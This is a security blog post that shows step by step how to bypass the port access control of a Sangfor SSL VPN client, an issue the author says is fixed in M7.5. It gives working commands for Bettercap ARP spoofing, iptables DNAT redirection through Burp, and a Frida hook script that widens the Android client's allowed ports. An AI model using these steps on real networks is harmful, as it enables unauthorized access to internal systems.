@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.154.5"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><meta name="description" content="Preface
+First, a disclaimer: this is an old issue. To fix it, you only need to upgrade to M7.5. Some time ago, I happened to see someone in a security chat talking about bypassing the ACL of Sangfor SSL VPN. I’d wanted to try it myself, but the only reference I could find online was this post from two years prior: Bypassing Sangfor SSL VPN access control with Burp. Unfortunately, the author heavily mosaicked the screenshots, leaving very little useful information, and I could barely understand what they were doing."><title>Sangfor SSL VPN Port ACL Bypass in Practice&nbsp;&ndash;&nbsp;Gorgias&#39; Blog</title><link rel="stylesheet" href="/css/core.min.363cdd0e3e6340dd0e88b1f21887fb7e53e3129ed31d7f3cf62686d06069621ece79dc5ffb48a77ebba54468e667212f.css" integrity="sha384-NjzdDj5jQN0OiLHyGIf7flPjEp7THX889iaG0GBpYh7Oedxf&#43;0infrulRGjmZyEv"><meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Sangfor SSL VPN Port ACL Bypass in Practice" /><body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/en/"><span class="site name">Gorgias' Blog</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/en/categories/">Categories</a><a class="nav item" href="/en/tags/">Tags</a><a class="nav item" href="/en/about/">About</a><a class="nav item" href="/en/links/">Links</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
+    <h1 class="article title">Sangfor SSL VPN Port ACL Bypass in Practice</h1><p class="article date">Saturday, March 24, 2018<span class="langs"><span class="lang">
+                    <a href="/zh/posts/sangfor-ssl-vpn-port-acl-bypass/" title="中文">
+                        <span class="lang-icon">🌐</span>中文</a>
+                </span></span></p></section><article class="article markdown-body"><h2 id="preface">Preface</h2>
+<p>First, a disclaimer: this is an old issue. To fix it, you only need to upgrade to <strong>M7.5</strong>. Some time ago, I happened to see someone in a security chat talking about bypassing the ACL of Sangfor SSL VPN. I’d wanted to try it myself, but the only reference I could find online was this post from two years prior: <a href="https://www.secpulse.com/archives/50144.html"target="_blank" rel="noopener noreferrer">Bypassing Sangfor SSL VPN access control with Burp</a>. Unfortunately, the author heavily mosaicked the screenshots, leaving very little useful information, and I could barely understand what they were doing.</p>
+<p>So I spent some time digging into it. It’s not as complicated as that post made it sound—it’s essentially a man-in-the-middle attack: after the server returns the ACL list, you replace the <strong>port range</strong>. The client enforces access control on ports, and the server enforces access control on IPs.
+The original reporter also raised the question of whether IP restrictions could be bypassed, but that part wasn’t validated or explained. The comments were full of “worship”, which made me think IP-based access control could also be bypassed.</p>
+<p>You could also hook the client to bypass its port enforcement, but that’s more work. Even though this is a simple topic, I picked up a few practical tricks during the process, so I’m recording them here.</p>
+<h2 id="network-layer">Network Layer</h2>
+<p>I tried three methods, all of which require Burp Suite. Since this is a MITM attack, Burp needs to run in <strong>invisible (transparent) proxy</strong> mode.</p>
+<p><img loading="lazy"  src="invisible_proxying.png"
+        alt="invisible_proxying"/></p>
+<h3 id="method-1-bettercap">Method 1: Bettercap</h3>
+<p>Bettercap is a MITM tool for real-world engagements, but it’s the least stable in a white-box lab setup.</p>
+<ul>
+<li>Client host: Sangfor SSL VPN</li>
+<li>MITM host: Bettercap + Burp Suite</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bettercap -I ens38 -G 192.168.1.1 -T target_ip -S ARP --custom-proxy burp_suite_ip --custom-proxy-port <span class="m">8080</span>
+</span></span></code></pre></div><p>The VPN server port is 443, so you need to redirect port 443 to Burp’s 8080. Of course, you can also run Burp as root and listen on 443 directly, which avoids the redirection.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo bettercap -I ens38 -G 192.168.1.1 -T target_ip -S ARP --custom-proxy burp_suite_ip --custom-proxy-port <span class="m">8080</span> --custom-https-proxy burp_suite_ip --custom-https-proxy-port <span class="m">8080</span> --custom-redirection <span class="s2">&#34;TCP 443 8080&#34;</span>
+</span></span></code></pre></div><p><img loading="lazy"  src="bettercap.png"
+        alt="bettercap"/></p>
+<h3 id="method-2-hosts">Method 2: hosts</h3>
+<p>Environment:</p>
+<ul>
+<li>Client host: Sangfor SSL VPN</li>
+<li>MITM host: Bettercap + Burp Suite</li>
+</ul>
+<p>You can also modify <code>hosts</code> directly, but Burp’s listening port must match the VPN port.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;target_ip vpn.test.com&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></div><h3 id="method-3-destination-nat">Method 3: Destination NAT</h3>
+<p>This method is the most stable, applies to many scenarios, and works well when the client host cannot use a local proxy:</p>
+<ol>
+<li>The client checks and does not allow a system proxy.</li>
+<li>After enabling VPN on Android, the proxy setting in Wi‑Fi network settings becomes ineffective.</li>
+</ol>
+<p>Sangfor VPN has poor Linux compatibility, so the client typically runs on Windows or mobile. It’s best to separate the gateway from the client host. Environment:</p>
+<ul>
+<li>Client host: with Sangfor SSL VPN installed</li>
+<li>MITM host: Burp Suite</li>
+<li>MITM gateway: iptables</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 开启IPv4内核转发</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/net/ipv4/ip_forward
+</span></span><span class="line"><span class="cl">iptables -F
+</span></span><span class="line"><span class="cl">iptables -X
+</span></span><span class="line"><span class="cl">iptables -t nat -F
+</span></span><span class="line"><span class="cl">iptables -t nat -X
+</span></span><span class="line"><span class="cl">iptables -t mangle -F
+</span></span><span class="line"><span class="cl">iptables -t mangle -X
+</span></span><span class="line"><span class="cl">iptables -t raw -F
+</span></span><span class="line"><span class="cl">iptables -t raw -X
+</span></span><span class="line"><span class="cl">iptables -t security -F
+</span></span><span class="line"><span class="cl">iptables -t security -X
+</span></span><span class="line"><span class="cl">iptables -P INPUT ACCEPT
+</span></span><span class="line"><span class="cl">iptables -P FORWARD ACCEPT
+</span></span><span class="line"><span class="cl">iptables -P OUTPUT ACCEPT
+</span></span><span class="line"><span class="cl"><span class="c1"># 假设客户端主机网段是192.168.1.0/24，客户端主机通过中间人网关机的eth0上网</span>
+</span></span><span class="line"><span class="cl">iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j MASQUERADE
+</span></span><span class="line"><span class="cl"><span class="c1"># 当访问VPN服务器的地址vpn_server_ip:443时，目标地址转换成burp_suite_ip:8080</span>
+</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -d vpn_server_ip -p tcp --dport <span class="m">443</span> -j DNAT --to-destination burp_suite_ip.:8080
+</span></span></code></pre></div><h3 id="follow-up-steps">Follow-up steps</h3>
+<p>First, set up Burp’s replacement rule.
+<img loading="lazy"  src="replace_rule.png"
+        alt="replace_rule"/></p>
+<p>Then, start logging into the VPN.</p>
+<p><img loading="lazy"  src="target_request.png"
+        alt="target_request"/></p>
+<p>After the <code>/por/rclist.csp</code> request finishes, immediately disable Burp proxying; otherwise traffic becomes too slow and the VPN disconnects. After disabling Burp, the network connection can still stay up.
+Method 3 is the most convenient here because you don’t need to touch the client host; Method 2 is more annoying; Method 1 may introduce delays.</p>
+<p><img loading="lazy"  src="DNAT.png"
+        alt="DNAT"/></p>
+<p>At this point, the client receives an ACL table whose port range has been tampered with.</p>
+<p><img loading="lazy"  src="malicious_acl.png"
+        alt="malicious_acl"/></p>
+<p>First, check that the PREROUTING rule number in the NAT table is 1.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; iptables -t nat -L --line-number
+</span></span><span class="line"><span class="cl">Chain PREROUTING <span class="o">(</span>policy ACCEPT<span class="o">)</span>
+</span></span><span class="line"><span class="cl">num  target     prot opt <span class="nb">source</span>               destination
+</span></span><span class="line"><span class="cl"><span class="m">1</span>    DNAT       tcp  --  anywhere             vpn_server_ip         tcp dpt:https to:burp_suite_ip:8080
+</span></span></code></pre></div><p>Delete it, and you can bypass the client-side port ACL.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">iptables -t nat -D PREROUTING <span class="m">1</span>
+</span></span></code></pre></div><h2 id="application-layer">Application Layer</h2>
+<p>I only tested this on Android. The client was not protected/obfuscated, so it was fairly convenient.
+Open EasyConnect with jadx, then search for the keyword <code>rclist.csp</code>.
+<img loading="lazy"  src="keywords.png"
+        alt="keywords"/></p>
+<p>Follow the references until you find a suitable place to hook the server’s response.
+<img loading="lazy"  src="code1.png"
+        alt="code1"/>
+<img loading="lazy"  src="code2.png"
+        alt="code2"/></p>
+<p>Then write a hook script to set the port range to the maximum, and save it as <code>2.js</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">hookIt</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">rclist</span><span class="o">=</span><span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s2">&#34;com.sangfor.vpn.client.service.d.a&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">rclist</span><span class="p">.</span><span class="nx">a</span><span class="p">.</span><span class="nx">overload</span><span class="p">(</span><span class="s1">&#39;java.lang.String&#39;</span><span class="p">).</span><span class="nx">implementation</span><span class="o">=</span><span class="nx">replacePorts</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">replacePorts</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">str</span> <span class="o">=</span> <span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/port=&#34;[^\&#34;]+&#34;/g</span><span class="p">,</span> <span class="s1">&#39;port=&#34;1~65535&#34;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;str replaced: &#34;</span> <span class="o">+</span> <span class="nx">str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">a</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">Java</span><span class="p">.</span><span class="nx">perform</span><span class="p">(</span><span class="nx">hookIt</span><span class="p">);</span>
+</span></span></code></pre></div><p>My Android device is 64-bit and rooted. Start the Frida service via adb:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">adb push frida-server-10.7.6-android-arm64 /data/local/tmp/
+</span></span><span class="line"><span class="cl">adb shell chmod <span class="m">755</span> /data/local/tmp/frida-server-10.7.6-android-arm64
+</span></span><span class="line"><span class="cl">adb shell su -c /data/local/tmp/frida-server-10.7.6-android-arm64
+</span></span></code></pre></div><p>Use <code>frida-ps</code> to find EasyConnect’s process name:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">frida-ps -aU <span class="p">|</span> grep sangfor
+</span></span></code></pre></div><p><img loading="lazy"  src="ps.png"
+        alt="ps"/></p>
+<p>Run Frida and specify the hook script and process name:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">frida -U -l 2.js com.sangfor.vpn.client.phone
+</span></span></code></pre></div><p><img loading="lazy"  src="frida.png"
+        alt="frida"/></p>
+<p>You can see the port range has been modified.</p>
+<p>In real engagements, the steps above are pretty cumbersome. You could also build an “unrestricted” client using Sangfor SSL VPN’s SDK, but that’s too much work just to bypass port restrictions. At that point you might as well compromise a few more servers and pivot into the internal network directly.</p>
+<h2 id="reference">Reference</h2>
+<p><a href="https://www.frida.re/docs/home/"target="_blank" rel="noopener noreferrer">Frida Docs</a></p>
+<p><a href="https://linux.die.net/man/8/iptables"target="_blank" rel="noopener noreferrer">iptables</a></p>
+<p><a href="https://www.bettercap.org/"target="_blank" rel="noopener noreferrer">Bettercap</a></p>
+</article><section class="article labels"><a class="category" href=/en/categories/network-security/>Network Security</a><a class="tag" href=/en/tags/sangfor/>Sangfor</a><a class="tag" href=/en/tags/sslvpn/>SSLVPN</a></section>
+</div>
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/en/posts/linux-post-exploitation-pam-backdoor-notes/"><span class="iconfont icon-article"></span>Linux Post-Exploitation Notes: PAM Backdoor</a></p><p><a class="link" href="/en/posts/esim-notes/"><span class="iconfont icon-article"></span>eSIM Notes</a></p></section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">2015 - 2026 Gorgias' Blog. </p><p class="license">
+        <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">
+            <img alt="CC BY-NC-SA" loading="lazy" src="/images/by-nc.svg" style="vertical-align: middle; height: 1.2em; margin: 0 0.2em;" />
+            CC BY-NC-SA 4.0
+        </a>
+        (Attribution-NonCommercial-ShareAlike).
+    </p><p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
+        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div></section></body>
+
+</html>
